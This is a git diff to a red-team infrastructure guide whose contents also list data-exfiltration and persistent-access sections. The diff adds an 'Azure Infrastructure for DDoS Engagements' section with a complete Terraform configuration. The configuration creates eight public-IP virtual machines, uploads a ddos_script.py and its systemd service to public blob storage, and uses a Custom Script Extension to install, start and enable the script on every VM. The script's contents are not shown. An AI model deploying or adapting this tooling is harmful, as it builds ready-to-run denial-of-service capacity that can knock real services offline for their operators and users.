@@ -8,7 +8,8 @@ This document contains guidelines on deploying infrastructure that can be useful
 - [Deploy a static website via GitHub Pages](#deploy-a-static-website-via-github-pages)
 - [Maintain persistent access with Tailscale](#maintain-persistent-access-with-tailscale)  
 - [Deploy a Lambda function for data exfiltration](#deploy-a-lambda-function-for-data-exfiltration)  
-- [Deploy AWS Infrastructure for DDoS Engagements](#deploy-aws-infrastructure-for-ddos-engagements)
+- [Deploy AWS Infrastructure for DDoS Engagements](#deploy-aws-infrastructure-for-ddos-engagements)  
+- [Deploy Azure Infrastructure for DDoS Engagements](#deploy-azure-infrastructure-for-ddos-engagements)
 
 
 ## Deploy a static website via AWS S3 and CloudFront  
@@ -989,7 +990,7 @@ terraform init && terraform plan && terraform apply
 ```  
 
 
-[!NOTE]  
+> [!NOTE]  
 > If you get keys not present error during the provisioning, it is possible that you might have to upload the keys to different regions manually:   
 > `aws ec2 import-key-pair --region <region-here> --key-name aws-ddos-redteam-infra --public-key-material file://~/.ssh/aws-ddos-redteam-infra.pub`    
 
@@ -1045,6 +1046,177 @@ If you want to destroy the infrastructure run:
 ```sh
 terraform destroy
 ```  
+
+
+## Deploy Azure Infrastructure for DDoS Engagements
+Similar to [aws](#deploy-aws-infrastructure-for-ddos-engagements), you can also provision the infrastructure on azure.  
+
+Here is the PoC for the `main.tf`:  
+```hcl
+terraform {
+  required_version = "= 1.9.8"
+
+  required_providers {
+    azurerm = {
+      source  = "hashicorp/azurerm"
+      version = "= 3.71.0"
+    }
+  }
+}
+
+provider "azurerm" {
+  features {}
+  skip_provider_registration = true
+}
+
+
+# Resource group
+resource "azurerm_resource_group" "rg_west_europe" {
+  name     = "rg-ddos-west-europe"
+  location = "West Europe"
+}
+
+# Storage account and container
+resource "azurerm_storage_account" "storage_account" {
+  name                     = "myredteamstorageaccount"  # must be globally unique
+  resource_group_name      = azurerm_resource_group.rg_west_europe.name
+  location                 = azurerm_resource_group.rg_west_europe.location
+  account_tier             = "Standard"
+  account_replication_type = "LRS"
+}
+
+resource "azurerm_storage_container" "scripts" {
+  name                  = "scripts"
+  storage_account_name  = azurerm_storage_account.storage_account.name
+  container_access_type = "blob"
+}
+
+# Read the local script file
+resource "local_file" "ddos_script" {
+  filename = "${path.module}/ddos_script.py"
+  content  = file("${path.module}/ddos_script.py")
+}
+
+# Read the local service file
+resource "local_file" "ddos_service" {
+  filename = "${path.module}/ddos_script.service"
+  content  = file("${path.module}/ddos_script.service")
+}
+
+# Upload script to storage as a blob
+resource "azurerm_storage_blob" "ddos_script_blob" {
+  name                   = "ddos_script.py"
+  storage_account_name   = azurerm_storage_account.storage_account.name
+  storage_container_name = azurerm_storage_container.scripts.name
+  type                   = "Block"
+  source                 = local_file.ddos_script.filename
+}
+
+# Upload service to storage as a blob
+resource "azurerm_storage_blob" "ddos_service_blob" {
+  name                   = "ddos_script.service"
+  storage_account_name   = azurerm_storage_account.storage_account.name
+  storage_container_name = azurerm_storage_container.scripts.name
+  type                   = "Block"
+  source                 = local_file.ddos_service.filename
+}
+
+
+# Networking components
+resource "azurerm_virtual_network" "vnet" {
+  name                = "vnet-ddos"
+  location            = azurerm_resource_group.rg_west_europe.location
+  resource_group_name = azurerm_resource_group.rg_west_europe.name
+  address_space       = ["10.0.0.0/16"]
+}
+
+resource "azurerm_subnet" "subnet" {
+  name                 = "subnet-ddos"
+  resource_group_name  = azurerm_resource_group.rg_west_europe.name
+  virtual_network_name = azurerm_virtual_network.vnet.name
+  address_prefixes     = ["10.0.1.0/24"]
+}
+
+# Create multiple public IPs
+resource "azurerm_public_ip" "pip_west_europe" {
+  count              =8
+  name               = "pip-ddos-west-europe-${count.index}"
+  location           = azurerm_resource_group.rg_west_europe.location
+  resource_group_name = azurerm_resource_group.rg_west_europe.name
+  allocation_method  = "Static"
+}
+
+# Create multiple network interfaces
+resource "azurerm_network_interface" "nic_west_europe" {
+  count               =8
+  name                = "nic-ddos-west-europe-${count.index}"
+  location            = azurerm_resource_group.rg_west_europe.location
+  resource_group_name = azurerm_resource_group.rg_west_europe.name
+
+  ip_configuration {
+    name                          = "internal"
+    subnet_id                     = azurerm_subnet.subnet.id
+    private_ip_address_allocation = "Dynamic"
+    public_ip_address_id          = azurerm_public_ip.pip_west_europe[count.index].id
+  }
+}
+
+# VMs creation and Custom Script Extension
+# Create multiple VMs
+resource "azurerm_linux_virtual_machine" "vm_west_europe" {
+  count               =8
+  name                = "vm-ddos-west-europe-${count.index}"
+  location            = azurerm_resource_group.rg_west_europe.location
+  resource_group_name = azurerm_resource_group.rg_west_europe.name
+  size                = "Standard_B1ls"
+  admin_username      = "ubuntu"
+  network_interface_ids = [azurerm_network_interface.nic_west_europe[count.index].id]
+  
+  admin_ssh_key {
+    username   = "ubuntu"
+    public_key = file("~/.ssh/az-ddos-redteam-infra.pub")
+  }
+
+  os_disk {
+    caching              = "ReadWrite"
+    storage_account_type = "Standard_LRS"
+    disk_size_gb         = 30
+  }
+
+  source_image_reference {
+    publisher = "Canonical"
+    offer     = "UbuntuServer"
+    sku       = "18.04-LTS"
+    version   = "latest"
+  }
+}
+
+# VM Extension for each VM
+resource "azurerm_virtual_machine_extension" "ddos_script" {
+  count                =8
+  name                 = "ddos-script-${count.index}"
+  virtual_machine_id   = azurerm_linux_virtual_machine.vm_west_europe[count.index].id
+  publisher            = "Microsoft.Azure.Extensions"
+  type                 = "CustomScript"
+  type_handler_version = "2.0"
+
+  settings = <<SETTINGS
+    {
+      "fileUris": [
+        "${azurerm_storage_blob.ddos_script_blob.url}",
+        "${azurerm_storage_blob.ddos_service_blob.url}"
+      ],
+      "commandToExecute": "bash -c 'sudo cp ddos_script.py /home/ubuntu/ && sudo cp ddos_script.service /etc/systemd/system/ && sudo systemctl daemon-reload && sudo systemctl start ddos_script && sudo systemctl enable ddos_script'"
+    }
+  SETTINGS
+}
+
+# Output each VM's IP address
+output "vm_ip_addresses" {
+  value = [for pip in azurerm_public_ip.pip_west_europe : pip.ip_address]
+}
+
+```
 
 
 
